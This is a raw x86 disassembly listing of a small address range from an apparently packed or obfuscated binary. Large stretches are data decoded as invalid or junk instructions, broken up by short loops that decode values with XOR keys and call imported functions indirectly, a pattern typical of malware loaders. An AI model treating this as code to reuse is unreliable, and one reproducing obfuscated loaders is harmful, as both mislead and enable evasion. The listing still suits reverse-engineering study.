  40a6cd:	icebp  
  40a6ce:	push   esp
  40a6cf:	jo     0x40a695
  40a6d1:	cli    
  40a6d2:	jp     0x40a717
  40a6d4:	cmp    DWORD PTR [ebp+0x5adc436d],0x11
  40a6db:	lea    edi,[esi]
  40a6dd:	aam    0x50
  40a6df:	pop    ebp
  40a6e0:	fcomp  DWORD PTR [edx]
  40a6e2:	mov    DWORD PTR [ecx+0x73abf012],ebp
  40a6e8:	inc    ebp
  40a6e9:	test   DWORD PTR [esi-0x24],esi
  40a6ec:	test   DWORD PTR [edi],0x787825eb
  40a6f2:	xor    eax,0x6245b47a
  40a6f7:	js     0x40a71b
  40a6f9:	pop    ss
  40a6fa:	add    cl,ah
  40a6fc:	add    DWORD PTR [ecx+edx*4],edx
  40a6ff:	jg     0x40a780
  40a701:	enter  0x1c0,0x64
  40a705:	shr    al,0x2d
  40a708:	js     0x40a6a4
  40a70a:	inc    esp
  40a70b:	aam    0xc1
  40a70d:	jecxz  0x40a74c
  40a70f:	retf   
  40a710:	scas   eax,DWORD PTR es:[edi]
  40a711:	push   eax
  40a712:	es inc ecx
  40a714:	or     bl,dl
  40a716:	das    
  40a717:	lock inc edi
  40a719:	cmp    eax,DWORD PTR [ecx-0x747a72df]
  40a71f:	ss call 0x5e69:0xe16d193e
  40a727:	mov    esi,0xf9ebb20c
  40a72c:	(bad)  
  40a72d:	sahf   
  40a72e:	arpl   ax,ax
  40a730:	jle    0x40a74b
  40a732:	gs mov bh,0x8b
  40a735:	es adc bl,cl
  40a738:	addr16 mov al,ds:0x71b7
  40a73c:	mov    ss,WORD PTR [esp+ebx*4]
  40a73f:	mov    edi,0xa223c82
  40a744:	xchg   di,ax
  40a746:	inc    eax
  40a747:	js     0x40a6f1
  40a749:	repnz aad 0xa
  40a74c:	in     al,dx
  40a74d:	cmc    
  40a74e:	add    cl,BYTE PTR [edx+edi*1]
  40a751:	fmul   DWORD PTR [eax]
  40a753:	mov    eax,0xe11a5a41
  40a758:	pop    edi
  40a759:	ss inc edx
  40a75b:	mov    eax,0xe708aef7
  40a760:	(bad)
  40a764:	inc    ebx
  40a765:	dec    esp
  40a766:	into   
  40a767:	iret   
  40a768:	cwde   
  40a769:	call   0x21a2:0xe5fb20d5
  40a770:	ret    
  40a771:	imul   esi,ebp,0x22466f13
  40a777:	and    eax,0xdb3efa39
  40a77c:	daa    
  40a77d:	pop    ss
  40a77e:	pop    ebp
  40a77f:	aaa    
  40a780:	push   ds
  40a781:	loopne 0x40a7de
  40a783:	ins    DWORD PTR es:[edi],dx
  40a784:	(bad)  
  40a785:	or     BYTE PTR [edi+ebx*1+0x4c588fe3],bh
  40a78c:	push   edi
  40a78d:	jmp    0x40a945
  40a792:	mov    ah,0x79
  40a794:	jae    0x40a807
  40a796:	jno    0x40a809
  40a798:	mov    dl,0x39
  40a79a:	hlt    
  40a79b:	or     ebp,DWORD PTR [edx+ebp*2+0x53]
  40a79f:	inc    eax
  40a7a0:	xor    eax,0x70ef7731
  40a7a5:	jo     0x40a73c
  40a7a7:	jg     0x40a819
  40a7a9:	jo     0x40a7f0
  40a7ab:	push   edx
  40a7ac:	arpl   di,bp
  40a7ae:	inc    BYTE PTR [ebp-0x5239d732]
  40a7b4:	jge    0x40a797
  40a7b6:	add    ecx,esp
  40a7b8:	xor    edx,esi
  40a7ba:	inc    ebp
  40a7bb:	adc    edi,DWORD PTR [ebp+0x4c]
  40a7be:	int    0xff
  40a7c0:	call   0xda598c14
  40a7c5:	scas   eax,DWORD PTR es:[edi]
  40a7c6:	into   
  40a7c7:	pop    edi
  40a7c8:	sar    bh,1
  40a7ca:	jae    0x40a7f8
  40a7cc:	out    dx,al
  40a7cd:	sahf   
  40a7ce:	out    0x32,al
  40a7d0:	xor    al,0xb0
  40a7d2:	cmp    BYTE PTR [ecx],dl
  40a7d4:	clc    
  40a7d5:	cli    
  40a7d6:	fst    st(2)
  40a7d8:	add    esp,DWORD PTR [ebx]
  40a7da:	stos   BYTE PTR es:[edi],al
  40a7db:	fnop   
  40a7dd:	mov    ds:0x53e74578,eax
  40a7e2:	xor    esp,DWORD PTR [eax+0x12afab78]
  40a7e8:	mov    eax,0xce408a2
  40a7ed:	call   0x1467225b
  40a7f2:	jae    0x40a797
  40a7f4:	pop    edx
  40a7f5:	add    ch,BYTE PTR [esi]
  40a7f7:	cs jmp 0x40a7f3
  40a7fa:	out    dx,al
  40a7fb:	ret    0x9590
  40a7fe:	add    DWORD PTR [ecx],ecx
  40a800:	in     al,dx
  40a801:	lahf   
  40a802:	enter  0x9f4b,0x9d
  40a806:	mov    eax,ds:0x1bb77ea8
  40a80b:	cmc    
  40a80c:	push   es
  40a80d:	sahf   
  40a80e:	aas    
  40a80f:	repnz inc esi
  40a811:	pop    esp
  40a812:	(bad)  
  40a813:	fdiv   DWORD PTR [ecx-0x668d31a4]
  40a819:	in     al,0x3e
  40a81b:	ret    
  40a81c:	sub    al,0x36
  40a81e:	pop    esi
  40a81f:	xor    al,0xa2
  40a821:	mov    ebp,0x60e905a8
  40a826:	fisttp DWORD PTR [ebp-0x3424631f]
  40a82c:	mov    al,ds:0xdea48178
  40a831:	frstor [eax-0x7e]
  40a834:	or     esi,DWORD PTR [edi+0x6f9d122c]
  40a83a:	gs (bad) 
  40a83c:	shl    DWORD PTR [edi],0x2f
  40a83f:	ja     0x40a7c8
  40a841:	adc    eax,0x785f858d
  40a846:	in     al,0xf3
  40a848:	cmp    BYTE PTR [esi],0x21
  40a84b:	xchg   edx,eax
  40a84c:	addr16 out dx,eax
  40a84e:	rol    BYTE PTR [edx+edx*2-0x6f],cl
  40a852:	int3   
  40a853:	mov    edi,edx
  40a855:	retf   0x390a
  40a858:	sbb    al,0x5f
  40a85a:	in     al,dx
  40a85b:	mov    esp,0x7dda7736
  40a860:	sahf   
  40a861:	sahf   
  40a862:	fst    DWORD PTR [ecx]
  40a864:	ja     0x40a822
  40a866:	cmp    al,0x14
  40a868:	and    eax,0xc7ed349b
  40a86d:	out    dx,eax
  40a86e:	inc    esp
  40a86f:	pop    edx
  40a870:	sbb    eax,0xef104c4b
  40a875:	sub    al,0x41
  40a877:	imul   ebx,DWORD PTR [edi],0xffffffcf
  40a87a:	(bad)  
  40a87c:	sar    BYTE PTR [ecx+0x21],1
  40a87f:	mov    ecx,0x97b28596
  40a884:	mov    ecx,0x2bce41f2
  40a889:	mov    bl,ah
  40a88b:	int    0x87
  40a88d:	mov    bh,0xad
  40a88f:	mov    ch,0x1
  40a891:	ss cld 
  40a893:	add    DWORD PTR [eax-0x5a],eax
  40a896:	sahf   
  40a897:	out    0x6d,al
  40a899:	in     eax,dx
  40a89a:	rcl    BYTE PTR [ebx],1
  40a89c:	xor    ch,bl
  40a89e:	loop   0x40a900
  40a8a0:	fadd   st,st(2)
  40a8a2:	or     esi,esi
  40a8a4:	add    DWORD PTR [edx],edx
  40a8a6:	aad    0x59
  40a8a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8a9:	pop    ss
  40a8aa:	sbb    edi,DWORD PTR [edi-0x6f]
  40a8ad:	mov    dl,BYTE PTR [esi]
  40a8af:	in     al,dx
  40a8b0:	test   BYTE PTR [ecx-0xe45dbee],cl
  40a8b6:	jmp    0x99c:0x63a41102
  40a8bd:	or     eax,0x844a5fdd
  40a8c2:	test   BYTE PTR fs:[eax],dl
  40a8c5:	gs sub eax,0x1a01ee54
  40a8cb:	test   al,0x47
  40a8cd:	das    
  40a8ce:	mov    eax,ds:0x3819d3f2
  40a8d3:	test   eax,0xcdbc0cc5
  40a8d8:	lahf   
  40a8d9:	dec    eax
  40a8da:	mov    WORD PTR [esi],gs
  40a8dc:	inc    edi
  40a8dd:	xor    edx,esi
  40a8df:	iret   
  40a8e0:	pushf  
  40a8e1:	rol    DWORD PTR [edx-0x3b246a26],cl
  40a8e7:	in     eax,dx
  40a8e8:	sbb    BYTE PTR [ebp+0x3eff8db],ch
  40a8ee:	popf   
  40a8ef:	test   al,0xd1
  40a8f1:	mov    edi,0xf97c1427
  40a8f6:	enter  0x1fe4,0xca
  40a8fa:	(bad)  
  40a8fb:	stc    
  40a8fc:	js     0x40a92b
  40a8fe:	push   eax
  40a8ff:	xor    dl,cl
  40a901:	sbb    al,0xff
  40a903:	ror    BYTE PTR [edi-0x3ddab08e],0x21
  40a90a:	mov    ds,WORD PTR [esi]
  40a90c:	pop    ebp
  40a90d:	push   es
  40a90e:	inc    ecx
  40a90f:	inc    ebx
  40a910:	mov    eax,DWORD PTR [ebx]
  40a912:	and    DWORD PTR [esi+esi*4-0x52],ecx
  40a916:	js     0x40a981
  40a918:	cdq    
  40a919:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a91a:	and    al,BYTE PTR [edx-0x4d]
  40a91d:	push   cs
  40a91e:	jg     0x40a955
  40a920:	fnsave [eax+0x34]
  40a923:	lahf   
  40a924:	jb     0x40a8fe
  40a926:	cli    
  40a927:	pop    ebp
  40a928:	lods   al,BYTE PTR ds:[esi]
  40a929:	lods   eax,DWORD PTR ds:[esi]
  40a92a:	or     DWORD PTR [esi+0x2f],esp
  40a92d:	and    BYTE PTR [esi],ch
  40a92f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a930:	das    
  40a931:	jae    0x40a975
  40a933:	not    BYTE PTR [ebx+esi*4]
  40a936:	leave  
  40a937:	(bad)
  40a93a:	xchg   esp,eax
  40a93b:	adc    BYTE PTR [edi],dh
  40a93d:	sub    dh,BYTE PTR [eax]
  40a93f:	into   
  40a940:	stos   BYTE PTR es:[edi],al
  40a941:	push   esi
  40a942:	add    BYTE PTR [ecx-0x37],dl
  40a945:	mov    edi,0x32729c
  40a94a:	adc    ebx,DWORD PTR ds:0x432708
  40a950:	add    eax,edi
  40a952:	sbb    DWORD PTR ds:0x432de2,edi
  40a958:	mov    DWORD PTR [ecx],eax
  40a95a:	not    DWORD PTR ds:0x434421
  40a960:	lea    eax,[ebp-0x4]
  40a963:	xor    DWORD PTR ds:0x432de2,ecx
  40a969:	mov    DWORD PTR [ebp-0x10],eax
  40a96c:	mov    eax,DWORD PTR [ebp+0x8]
  40a96f:	add    DWORD PTR ds:0x432dca,edx
  40a975:	mov    ecx,DWORD PTR [ebp-0x10]
  40a978:	xor    eax,esi
  40a97a:	and    DWORD PTR ds:0x4326fc,0x0
  40a984:	jmp    0x40a996
  40a989:	mov    ebx,DWORD PTR ds:0x4326fc
  40a98f:	inc    ebx
  40a990:	mov    DWORD PTR ds:0x4326fc,ebx
  40a996:	cmp    DWORD PTR ds:0x4326fc,0x1a
  40a99d:	jae    0x40a9da
  40a9a3:	cmp    DWORD PTR ds:0x4326fc,0x8
  40a9aa:	jne    0x40a9bb
  40a9b0:	push   0x184e
  40a9b5:	call   DWORD PTR ds:0x432d12
  40a9bb:	cmp    DWORD PTR ds:0x4326fc,0x7
  40a9c2:	jne    0x40a9d5
  40a9c8:	mov    ebx,DWORD PTR ds:0x4326fc
  40a9ce:	inc    ebx
  40a9cf:	mov    DWORD PTR ds:0x4326fc,ebx
  40a9d5:	jmp    0x40a989
  40a9da:	add    eax,edi
  40a9dc:	mov    DWORD PTR [ecx],eax
  40a9de:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a9e5:	lea    eax,[ebp-0x18]
  40a9e8:	and    DWORD PTR ds:0x4326f8,0x0
  40a9f2:	jmp    0x40aa04
  40a9f7:	mov    ecx,DWORD PTR ds:0x4326f8
  40a9fd:	inc    ecx
  40a9fe:	mov    DWORD PTR ds:0x4326f8,ecx
  40aa04:	cmp    DWORD PTR ds:0x4326f8,0x16
  40aa0b:	jae    0x40aa5e
  40aa11:	cmp    DWORD PTR ds:0x4326f8,0x4
  40aa18:	jne    0x40aa39
  40aa1e:	push   0x5697
  40aa23:	push   DWORD PTR [ebp-0xc]
  40aa26:	push   0x541e
  40aa2b:	push   0x8aca
  40aa30:	push   DWORD PTR [ebp-0x24]
  40aa33:	call   DWORD PTR ds:0x432c62
  40aa39:	cmp    DWORD PTR ds:0x4326f8,0x3
  40aa40:	jne    0x40aa53
  40aa46:	mov    ecx,DWORD PTR ds:0x4326f8
  40aa4c:	inc    ecx
  40aa4d:	mov    DWORD PTR ds:0x4326f8,ecx
  40aa53:	jmp    0x40a9f7
  40aa58:	and    DWORD PTR ds:0x434376,ecx
  40aa5e:	mov    DWORD PTR [ebp-0x24],eax
  40aa61:	and    DWORD PTR ds:0x43437e,0x0
  40aa6b:	jmp    0x40aa7f
  40aa70:	xor    ecx,ecx
  40aa72:	add    ecx,DWORD PTR ds:0x43437e
  40aa78:	inc    ecx
  40aa79:	mov    DWORD PTR ds:0x43437e,ecx
  40aa7f:	cmp    DWORD PTR ds:0x43437e,0x18
  40aa86:	jae    0x40aab3
  40aa8c:	cmp    DWORD PTR ds:0x43437e,0x20
  40aa93:	jne    0x40aaae
  40aa99:	push   0x6696
  40aa9e:	push   0x74e3
  40aaa3:	push   0x43275d
  40aaa8:	call   DWORD PTR ds:0x432d16
  40aaae:	jmp    0x40aa70
  40aab3:	mov    eax,DWORD PTR [ebp-0x18]
  40aab6:	add    DWORD PTR ds:0x43436e,0x336
  40aac0:	mov    ecx,DWORD PTR [ebp-0x24]
  40aac3:	sub    DWORD PTR ds:0x4343a2,ebx
  40aac9:	xor    eax,esi
  40aacb:	add    DWORD PTR ds:0x432dc6,ebx
  40aad1:	add    eax,edi
  40aad3:	neg    ebx
  40aad5:	mov    DWORD PTR [ecx],eax
  40aad7:	mov    eax,ds:0x416274
  40aadc:	movzx  ebx,WORD PTR ds:0x434392
  40aae3:	sbb    DWORD PTR ds:0x4326ec,ebx
  40aae9:	mov    ebx,0x8e12febe
  40aaee:	mov    DWORD PTR ds:0x434419,0x7eb1
  40aaf8:	mov    DWORD PTR [ebp-0xc],ebx
  40aafb:	mov    eax,DWORD PTR [eax]
  40aafd:	or     DWORD PTR ds:0x432de2,0x3ff6
  40ab07:	mov    cx,WORD PTR [ebp-0x4]
  40ab0b:	add    DWORD PTR ds:0x434392,0x7366
  40ab15:	movzx  ecx,cx
  40ab18:	add    ecx,DWORD PTR [eax]
  40ab1a:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40ab21:	mov    DWORD PTR [ebp-0x1c],ecx
  40ab24:	jmp    0x40acdc
  40ab29:	jbe    0x40ab3f
  40ab2b:	dec    eax
  40ab2c:	sahf   
  40ab2d:	jb     0x40ab89
  40ab2f:	jbe    0x40ab05
  40ab31:	xor    eax,0x5c7cbad5
  40ab36:	inc    esp
  40ab37:	cmc    
  40ab38:	mov    esi,0x7070ed8c
  40ab3d:	xchg   ebp,eax
  40ab3e:	jg     0x40abb0
  40ab40:	jo     0x40aaff
  40ab42:	outs   dx,DWORD PTR ds:[esi]
  40ab43:	js     0x40aacb
  40ab45:	dec    esp
  40ab46:	mov    bh,0xa6
  40ab48:	je     0x40ab27
  40ab4a:	mov    cl,0xbf
  40ab4c:	out    0x3a,eax
  40ab4e:	into   
  40ab4f:	and    al,0x9a
  40ab51:	pop    ss
  40ab52:	stos   DWORD PTR es:[edi],eax
  40ab53:	sbb    edx,ebp
  40ab55:	enter  0xfd34,0xdf
  40ab59:	push   0x822805cf
  40ab5e:	iret   
  40ab5f:	mov    ebx,0x13ba25e1
  40ab64:	pop    ds
  40ab65:	mov    edx,0x3e435c6f
  40ab6a:	inc    edi
  40ab6b:	xor    BYTE PTR [esi+0x23e9ef9c],al
  40ab71:	pop    esi
  40ab72:	retf   
  40ab73:	sbb    BYTE PTR [ebp-0x25],ah
  40ab76:	adc    bl,0x9b
  40ab79:	mov    ecx,0x2fd9a5ad
  40ab7e:	popa   
  40ab7f:	imul   ebp,DWORD PTR [esi-0x23],0x4803d579
  40ab86:	inc    edi
  40ab87:	js     0x40abb9
  40ab89:	ja     0x40abd6
  40ab8b:	adc    edi,DWORD PTR [ecx]
  40ab8d:	fdivr  DWORD PTR [eax-0x75]
  40ab90:	idiv   BYTE PTR [ebp-0x6e]
  40ab93:	and    al,0xaa
  40ab95:	inc    ebx
  40ab96:	lods   al,BYTE PTR ds:[esi]
  40ab97:	xchg   edi,eax
  40ab98:	pop    ebp
  40ab99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab9a:	into   
  40ab9b:	inc    eax
  40ab9c:	call   0x9a5a:0xd0e1d48e
  40aba3:	rol    BYTE PTR [eax+eax*1],cl
  40aba6:	sbb    esi,ebx
  40aba8:	pop    es
  40aba9:	pop    eax
  40abaa:	jo     0x40ac0d
  40abac:	lahf   
  40abad:	call   0x7f5f:0x6194c20a
  40abb4:	pop    es
  40abb5:	dec    edx
  40abb6:	pop    ecx
  40abb7:	ret    0xe18
  40abba:	es pop edx
  40abbc:	mov    esi,0x83de6d17
  40abc1:	(bad)  
  40abc2:	enter  0x64ff,0x16
  40abc6:	pop    edi
  40abc7:	iret   
  40abc8:	iret   
  40abc9:	mov    ds:0x1e5c72a4,al
  40abce:	sbb    cl,dh
  40abd0:	jge    0x40ac3f
  40abd2:	jg     0x40ab78
  40abd4:	or     eax,0x7444e9b3
  40abd9:	jmp    0x40ac53
  40abdb:	popf   
  40abdc:	pusha  
  40abdd:	mov    cl,0xae
  40abdf:	push   edx
  40abe0:	dec    edx
  40abe1:	and    ebp,DWORD PTR [edi+ebp*4]
  40abe4:	call   0x934dc6f9
  40abe9:	pop    ecx
  40abea:	inc    esi
  40abeb:	and    dl,BYTE PTR [eax]
  40abed:	arpl   WORD PTR [ebx+0x1c],ax
  40abf0:	cmp    DWORD PTR [edi+0x3c],ebp
  40abf3:	mov    cl,0xa7
  40abf5:	mov    bl,0xda
  40abf7:	push   0xffffffa2
  40abf9:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abfb:	add    ecx,DWORD PTR [eax]
  40abfd:	into   
  40abfe:	dec    eax
  40abff:	clc    
  40ac00:	aaa    
  40ac01:	aam    0x37
  40ac03:	repz pop eax
  40ac05:	rcr    DWORD PTR gs:[ebp-0x4fd2b92],0x40
  40ac0d:	mov    esp,0xf57bcebb
  40ac12:	mov    al,ds:0xf82a46d1
  40ac17:	push   0xffffffe0
  40ac19:	fwait
  40ac1a:	pop    ds
  40ac1b:	jbe    0x40ac68
  40ac1d:	std    
  40ac1e:	bound  eax,QWORD PTR [ebx]
  40ac20:	xor    DWORD PTR [ebp+0x40e66d35],0x98d1d624
  40ac2a:	sbb    al,0xba
  40ac2c:	pop    ebp
  40ac2d:	mov    ch,ch
  40ac2f:	out    dx,al
  40ac30:	fidiv  WORD PTR [ecx+0x35b87ea1]
  40ac36:	test   eax,0xbdb1ca09
  40ac3b:	sahf   
  40ac3c:	add    esi,DWORD PTR [edi-0x5fc9f422]
  40ac42:	jno    0x40abca
  40ac44:	mov    bh,0xf0
  40ac46:	ss repnz mov dl,0xdf
  40ac4a:	shl    BYTE PTR [ebp-0xc],cl
  40ac4d:	add    BYTE PTR [edx-0x2cdb7747],dl
  40ac53:	int3   
  40ac54:	ss in  eax,dx
  40ac56:	xor    esp,eax
  40ac58:	pop    esi
  40ac59:	mov    dl,0x21
  40ac5b:	je     0x40ac8b
  40ac5d:	mov    dl,0xf
  40ac5f:	push   ss
  40ac60:	sbb    edi,DWORD PTR [eax]
  40ac62:	add    BYTE PTR [ebp+0x58],ch
  40ac65:	mov    ds:0x5c80d6f9,al
  40ac6a:	ja     0x40ac8f
  40ac6c:	sub    eax,0x8623743d
  40ac71:	in     al,dx
  40ac72:	(bad)  
  40ac73:	xor    DWORD PTR [ebx-0xf1046d],ebp
  40ac79:	in     al,0xd1
  40ac7b:	outs   dx,BYTE PTR ds:[esi]
  40ac7c:	sahf   
  40ac7d:	push   0xc6e08948
  40ac82:	mov    al,0x47
  40ac84:	je     0x40acc1
  40ac86:	das    
  40ac87:	mov    eax,0xbb1224e1
  40ac8c:	mov    es,WORD PTR [ebp+edx*1+0x4b4d10d5]
  40ac93:	loopne 0x40acba
  40ac95:	adc    edx,edi
  40ac97:	rcr    DWORD PTR [ecx+0x1f],0xbb
  40ac9b:	leave  
  40ac9c:	int3   
  40ac9d:	jne    0x40acae
  40ac9f:	test   al,0xaa
  40aca1:	add    DWORD PTR [ebx+ecx*8],0xe50ab162
  40aca8:	jge    0x40ac68
  40acaa:	pop    ebp
  40acab:	jne    0x40acec
  40acad:	push   esi
  40acae:	mov    edi,0xf53d7a52
  40acb3:	jecxz  0x40acc8
  40acb5:	jecxz  0x40acbe
  40acb7:	lods   eax,DWORD PTR ds:[esi]
  40acb8:	adc    DWORD PTR [ebx+0x44],0xd06eba7a
  40acbf:	adc    al,0x5
  40acc1:	cmp    DWORD PTR [esi+0x3f],ecx
  40acc4:	or     al,0x3
  40acc6:	stc    
  40acc7:	inc    edi
  40acc8:	and    al,BYTE PTR [ecx+0x61dda6fa]
  40acce:	mov    WORD PTR [edx],?
  40acd0:	xchg   edi,eax
  40acd1:	xchg   ecx,eax
  40acd2:	sbb    eax,0x8ddd7f26
  40acd7:	or     BYTE PTR [edx],bl
  40acd9:	jmp    0x45cbbf81
  40acde:	or     BYTE PTR [ebx-0x39cc07b3],cl
  40ace4:	add    eax,edi
  40ace6:	cmp    DWORD PTR [ecx],eax
  40ace8:	jne    0x40af2d
  40acee:	mov    eax,DWORD PTR [ebp+0x8]
  40acf1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40acf4:	xor    eax,esi
  40acf6:	add    eax,edi
  40acf8:	cmp    DWORD PTR [ecx],eax
  40acfa:	jne    0x40ad1d
  40ad00:	mov    eax,DWORD PTR [ebp+0x8]
  40ad03:	mov    ecx,DWORD PTR [ebp-0x10]
  40ad06:	xor    eax,esi
  40ad08:	add    eax,edi
  40ad0a:	mov    DWORD PTR [ecx],eax
  40ad0c:	mov    eax,DWORD PTR [ebp-0x10]
  40ad0f:	mov    ecx,DWORD PTR [ebp-0x14]
  40ad12:	xor    ecx,esi
  40ad14:	mov    edx,0xffcd8d64
  40ad19:	sub    edx,ecx
  40ad1b:	add    DWORD PTR [eax],edx
  40ad1d:	mov    eax,ds:0x416274
  40ad22:	mov    eax,DWORD PTR [eax]
  40ad24:	mov    cx,WORD PTR [ebp-0x4]
  40ad28:	movzx  ecx,cx
  40ad2b:	add    ecx,DWORD PTR [eax]
  40ad2d:	mov    DWORD PTR [ebp-0x1c],ecx
  40ad30:	mov    eax,DWORD PTR [ebp+0xc]
  40ad33:	jmp    0x40aeeb
  40ad38:	and    ecx,ecx
  40ad3a:	repnz call 0x5305:0x5171a1f2
  40ad42:	inc    esi
  40ad43:	std    
  40ad44:	or     BYTE PTR [esi-0x14de1d0a],dl
  40ad4a:	jo     0x40adbc
  40ad4c:	xchg   ebp,eax
  40ad4d:	jg     0x40adbf
  40ad4f:	jo     0x40ad11
  40ad51:	sub    DWORD PTR ds:0x26622d9a,ebp
  40ad57:	cs rol ebx,0x46
  40ad5b:	mov    esp,0xa892c696
  40ad60:	push   ebp
  40ad61:	fwait
  40ad62:	outs   dx,BYTE PTR ds:[esi]
  40ad63:	retf   
  40ad64:	(bad)  
  40ad65:	mov    dl,0x90
  40ad67:	(bad)  
  40ad68:	ror    DWORD PTR [edx],1
  40ad6a:	(bad)  
  40ad6b:	test   eax,0x51a7c84b
  40ad70:	sub    ch,al
  40ad72:	int3   
  40ad73:	pop    eax
  40ad74:	(bad)  
  40ad75:	fisubr DWORD PTR [edi+0xc]
  40ad78:	enter  0xe1e2,0x3c
  40ad7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad7d:	push   esp
  40ad7e:	mov    ebx,0x87a2f0e4
  40ad83:	adc    al,0x72
  40ad85:	xchg   edi,eax
  40ad86:	faddp  st(7),st
  40ad88:	in     al,0x3c
  40ad8a:	cmp    al,0xee
  40ad8c:	cmp    bh,BYTE PTR [edi]
  40ad8e:	jb     0x40adef
  40ad90:	or     edi,DWORD PTR [ebx]
  40ad92:	call   0x29f5ded7
  40ad97:	in     al,0xd7
  40ad99:	sub    DWORD PTR ds:0xfdbf5bd9,esi
  40ad9f:	xor    DWORD PTR [ecx-0x4dc46497],edx
  40ada5:	add    eax,0x84f7fa88
  40adaa:	xor    BYTE PTR [ebp+0x13b9e0b3],al
  40adb0:	xor    bh,dh
  40adb2:	mov    dl,BYTE PTR [edx+0x4c]
  40adb5:	fadd   st(6),st
  40adb7:	adc    DWORD PTR [eax+0x13e47bcf],edi
  40adbd:	jae    0x40ad7a
  40adbf:	nop
  40adc0:	mov    eax,0x13ff5b4b
  40adc5:	rcr    DWORD PTR [eax],0xb7
  40adc8:	fisub  DWORD PTR [ebx]
  40adca:	gs ins DWORD PTR es:[edi],dx
  40adcc:	pop    esi
  40adcd:	fldl2e 
  40adcf:	mov    ?,WORD PTR [ebx+0x52dff0f5]
  40add5:	(bad)  
  40add6:	jmp    0x7fcc8578
  40addb:	scas   al,BYTE PTR es:[edi]
  40addc:	test   DWORD PTR [esi+0x1],edx
  40addf:	add    edi,DWORD PTR [ebp+0x3]
  40ade2:	push   ds
  40ade3:	int    0x3f
  40ade5:	inc    edx
  40ade6:	lods   eax,DWORD PTR ds:[esi]
  40ade7:	mov    DWORD PTR [eax],esi
  40ade9:	jnp    0x40ae53
  40adeb:	out    dx,al
  40adec:	mov    ds:0x2e62542f,al
  40adf1:	(bad)  
  40adf2:	loopne 0x40adcb
  40adf4:	xchg   edi,eax
  40adf5:	jmp    0xd4a22262
  40adfa:	pop    es
  40adfb:	jo     0x40ad9a
  40adfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adfe:	dec    DWORD PTR [esi]
  40ae00:	sub    eax,0x3bed4eed
  40ae05:	jg     0x40ae80
  40ae07:	loopne 0x40adf0
  40ae09:	gs jecxz 0x40ad9a
  40ae0c:	xchg   ebp,eax
  40ae0d:	jle    0x40adb2
  40ae0f:	or     bl,0xc0
  40ae12:	sub    eax,0x3360224e
  40ae17:	addr16 mov dh,0x78
  40ae1a:	out    0xba,al
  40ae1c:	enter  0xbeaf,0x14
  40ae20:	not    bh
  40ae22:	std    
  40ae23:	stos   DWORD PTR es:[edi],eax
  40ae24:	in     eax,0x3f
  40ae26:	mov    bl,0xea
  40ae28:	test   BYTE PTR [ebp+0x722003c0],dh
  40ae2e:	leave  
  40ae2f:	jmp    0x727d:0x6265c0c2
  40ae36:	push   edi
  40ae37:	add    al,0x3a
  40ae39:	dec    ebx
  40ae3a:	mov    ds:0xad07868f,al
  40ae3f:	retf   
  40ae40:	enter  0x874b,0xf8
  40ae44:	lea    esp,[esi]
  40ae46:	sbb    dh,bh
  40ae48:	arpl   WORD PTR [ecx],cx
  40ae4a:	stos   BYTE PTR es:[edi],al
  40ae4b:	adc    ch,BYTE PTR [edi+0x1bfaccf8]
  40ae51:	inc    edi
  40ae52:	pop    esi
  40ae53:	xchg   BYTE PTR [ebx-0x7f39ce39],bl
  40ae59:	inc    eax
  40ae5a:	pusha  
  40ae5b:	and    esi,DWORD PTR [ebp+0x7e]
  40ae5e:	fldcw  WORD PTR [ecx]
  40ae60:	mov    ch,0x68
  40ae62:	aas    
  40ae63:	fidiv  DWORD PTR [esi]
  40ae65:	xor    DWORD PTR [ebp+0x30799abf],0x2fc80d11
  40ae6f:	mov    bl,0x6
  40ae71:	addr16 in eax,dx
  40ae73:	(bad)  
  40ae74:	pushf  
  40ae75:	or     DWORD PTR [eax],eax
  40ae77:	sbb    esi,DWORD PTR [edi]
  40ae79:	jp     0x40ae02
  40ae7b:	and    ch,cl
  40ae7d:	iret   
  40ae7e:	push   ds
  40ae7f:	retf   
  40ae80:	jmp    0x9f00:0x1789dcc9
  40ae87:	adc    DWORD PTR [edi-0x80],ecx
  40ae8a:	ins    DWORD PTR es:[edi],dx
  40ae8b:	pop    edx
  40ae8c:	mul    BYTE PTR [ebx+0x3d774398]
  40ae92:	jns    0x40ae2b
  40ae94:	dec    eax
  40ae95:	mov    edi,DWORD PTR [esi]
  40ae97:	inc    ebp
  40ae98:	xor    bl,BYTE PTR [ecx]
  40ae9a:	xor    eax,0xbef5626c
  40ae9f:	push   es
  40aea0:	pop    ss
  40aea1:	and    BYTE PTR [ecx],ah
  40aea3:	mov    esp,0xc324c406
  40aea8:	mov    ebx,0xa85960ab
  40aead:	jg     0x40aef1
  40aeaf:	(bad)  
  40aeb0:	fbstp  TBYTE PTR [esi-0x6033bfb2]
  40aeb6:	fsubp  st(3),st
  40aeb8:	daa    
  40aeb9:	cmp    eax,0x1fc0668f
  40aebe:	test   BYTE PTR ds:0x48790a40,al
  40aec4:	cdq    
  40aec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aec6:	test   DWORD PTR [esp+esi*1],edi
  40aec9:	out    0x64,eax
  40aecb:	xchg   BYTE PTR [ebx-0x7e6f70ac],cl
  40aed1:	xor    eax,0x36ab8df8
  40aed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aed7:	iret   
  40aed8:	std    
  40aed9:	add    eax,0x8f4e9480
  40aede:	mov    edi,0xb9414274
  40aee3:	mov    al,0xa1
  40aee5:	retf   
  40aee6:	aam    0x8c
  40aee8:	int3   
  40aee9:	sub    al,0x4a
  40aeeb:	mov    ecx,DWORD PTR [ebp+0xc]
  40aeee:	xor    eax,esi
  40aef0:	lea    eax,[eax+eax*1+0x32729c]
  40aef7:	xor    ecx,esi
  40aef9:	sub    ecx,eax
  40aefb:	mov    ax,WORD PTR [ebp-0x4]
  40aeff:	movzx  eax,ax
  40af02:	cmp    eax,ecx
  40af04:	mov    eax,DWORD PTR [ebp-0x14]
  40af07:	movzx  ecx,WORD PTR [ebp-0x4]
  40af0b:	jg     0x40af20
  40af11:	xor    eax,esi
  40af13:	sub    ecx,eax
